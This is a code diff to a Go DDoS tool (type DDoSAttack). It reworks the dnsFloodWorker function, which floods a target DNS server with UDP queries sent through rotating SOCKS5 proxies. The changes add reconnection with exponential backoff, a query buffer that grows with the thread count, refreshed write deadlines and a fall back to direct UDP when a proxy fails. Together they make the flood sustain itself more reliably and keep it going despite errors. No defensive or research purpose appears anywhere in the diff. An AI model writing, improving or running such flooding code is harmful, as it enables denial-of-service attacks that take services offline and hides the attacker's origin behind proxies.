@@ -289,11 +289,19 @@ func (d *DDoSAttack) dnsFloodWorker(dnsServerAddr *net.UDPAddr, queryBuilder *DN
 		defer conn.Close()
 	}
 
-	// Set write deadline
+	// Set write deadline with periodic refresh
 	conn.SetWriteDeadline(time.Now().Add(d.config.Timeout))
+	
+	// Track connection health and retry count
+	connectionRetries := 0
+	maxRetries := 3 // Maximum reconnection attempts before giving up
 
-	// Buffered channel for queries (producer-consumer pattern)
-	queryChan := make(chan []byte, 1000)
+	// Adaptive channel buffer sizing based on thread count
+	bufferSize := 1000
+	if d.config.MaxThreads > 1000 {
+		bufferSize = 2000
+	}
+	queryChan := make(chan []byte, bufferSize)
 
 	// Producer: continuously build queries
 	producerDone := make(chan struct{})
@@ -360,38 +368,88 @@ func (d *DDoSAttack) dnsFloodWorker(dnsServerAddr *net.UDPAddr, queryBuilder *DN
 			atomic.AddInt64(&d.bytesSent, int64(len(query)))
 			atomic.AddInt64(&d.activeConns, 1)
 
-			// Send query (fire-and-forget)
+			// Send query (fire-and-forget) with improved error handling
 			startTime := time.Now()
-			_, err := conn.Write(query)
-			if err != nil {
-				atomic.AddInt64(&d.requestsFailed, 1)
-				if usedProxy != "" {
-					d.markProxyFailure(usedProxy)
-				}
-				// Try to reconnect
+			
+			// Refresh write deadline periodically to prevent stale connections
+			if err := conn.SetWriteDeadline(time.Now().Add(d.config.Timeout)); err != nil {
+				// Connection is dead, need to reconnect
 				conn.Close()
-				if usedProxy != "" {
-					if proxyURL, ok := d.getNextProxy(); ok {
-						usedProxy = proxyURL
-						conn, err = d.dialUDPThroughProxy(proxyURL, dnsServerAddr)
-						if err != nil {
-							d.markProxyFailure(usedProxy)
+				connectionRetries++
+				if connectionRetries > maxRetries {
+					return // Too many retries, exit worker
+				}
+				// Reconnect with exponential backoff
+				select {
+				case <-d.ctx.Done():
+					return
+				case <-time.After(time.Duration(connectionRetries) * 100 * time.Millisecond):
+				}
+				// Reconnect logic below
+			} else {
+				_, err := conn.Write(query)
+				if err != nil {
+					atomic.AddInt64(&d.requestsFailed, 1)
+					if usedProxy != "" {
+						d.markProxyFailure(usedProxy)
+					}
+					
+					// Close and reconnect with improved logic
+					conn.Close()
+					connectionRetries++
+					if connectionRetries > maxRetries {
+						return // Too many retries
+					}
+					
+					// Exponential backoff before reconnecting
+					select {
+					case <-d.ctx.Done():
+						return
+					case <-time.After(time.Duration(connectionRetries) * 100 * time.Millisecond):
+					}
+					
+					// Try to reconnect
+					var reconnectErr error
+					if usedProxy != "" {
+						if proxyURL, ok := d.getNextProxy(); ok {
+							usedProxy = proxyURL
+							conn, reconnectErr = d.dialUDPThroughProxy(proxyURL, dnsServerAddr)
+							if reconnectErr != nil {
+								d.markProxyFailure(usedProxy)
+								usedProxy = ""
+								conn = nil
+							}
+						} else {
 							usedProxy = ""
 						}
 					}
-				}
-				if conn == nil {
-					conn, err = net.DialUDP("udp", nil, dnsServerAddr)
-					if err != nil {
-						return
+					
+					if conn == nil {
+						conn, reconnectErr = net.DialUDP("udp", nil, dnsServerAddr)
+						if reconnectErr != nil {
+							// Reconnection failed, wait before next attempt
+							select {
+							case <-d.ctx.Done():
+								return
+							case <-time.After(time.Duration(connectionRetries) * 200 * time.Millisecond):
+							}
+							continue // Skip this query and try again
+						}
 					}
-				}
-				conn.SetWriteDeadline(time.Now().Add(d.config.Timeout))
-			} else {
-				atomic.AddInt64(&d.requestsSuccess, 1)
-				if usedProxy != "" {
-					responseTime := time.Since(startTime)
-					d.markProxySuccess(usedProxy, responseTime)
+					
+					// Reset retry count on successful reconnection
+					if reconnectErr == nil {
+						connectionRetries = 0
+						conn.SetWriteDeadline(time.Now().Add(d.config.Timeout))
+					}
+				} else {
+					// Success - reset retry counter
+					connectionRetries = 0
+					atomic.AddInt64(&d.requestsSuccess, 1)
+					if usedProxy != "" {
+						responseTime := time.Since(startTime)
+						d.markProxySuccess(usedProxy, responseTime)
+					}
 				}
 			}
 			atomic.AddInt64(&d.activeConns, -1)
@@ -400,6 +458,7 @@ func (d *DDoSAttack) dnsFloodWorker(dnsServerAddr *net.UDPAddr, queryBuilder *DN
 }
 
 // dialUDPThroughProxy creates a UDP connection through a SOCKS5 proxy
+// Improved with better error handling and retry logic
 func (d *DDoSAttack) dialUDPThroughProxy(proxyURL string, targetAddr *net.UDPAddr) (net.Conn, error) {
 	// Parse proxy URL
 	parsed, err := parseProxyURL(proxyURL)
@@ -413,7 +472,7 @@ func (d *DDoSAttack) dialUDPThroughProxy(proxyURL string, targetAddr *net.UDPAdd
 		return net.DialUDP("udp", nil, targetAddr)
 	}
 
-	// Create SOCKS5 dialer
+	// Create SOCKS5 dialer with timeout
 	var auth *proxy.Auth
 	if parsed.User != nil {
 		password, _ := parsed.User.Password()
@@ -423,17 +482,34 @@ func (d *DDoSAttack) dialUDPThroughProxy(proxyURL string, targetAddr *net.UDPAdd
 		}
 	}
 
-	dialer, err := proxy.SOCKS5("tcp", parsed.Host, auth, proxy.Direct)
+	// Retry SOCKS5 connection up to 2 times
+	var dialer proxy.Dialer
+	maxRetries := 2
+	for retry := 0; retry < maxRetries; retry++ {
+		dialer, err = proxy.SOCKS5("tcp", parsed.Host, auth, proxy.Direct)
+		if err == nil {
+			break
+		}
+		if retry < maxRetries-1 {
+			// Brief delay before retry
+			select {
+			case <-d.ctx.Done():
+				return nil, err
+			case <-time.After(time.Duration(retry+1) * 100 * time.Millisecond):
+			}
+		}
+	}
+	
 	if err != nil {
-		return nil, err
+		// Fallback to direct connection if SOCKS5 setup fails
+		return net.DialUDP("udp", nil, targetAddr)
 	}
 
-	// Dial UDP through SOCKS5
+	// Dial UDP through SOCKS5 with timeout
 	// Note: SOCKS5 UDP association requires a TCP control connection first
-	// For simplicity, we'll use direct UDP if SOCKS5 UDP fails
 	conn, err := dialer.Dial("udp", targetAddr.String())
 	if err != nil {
-		// Fallback to direct connection
+		// Fallback to direct connection on error
 		return net.DialUDP("udp", nil, targetAddr)
 	}
 
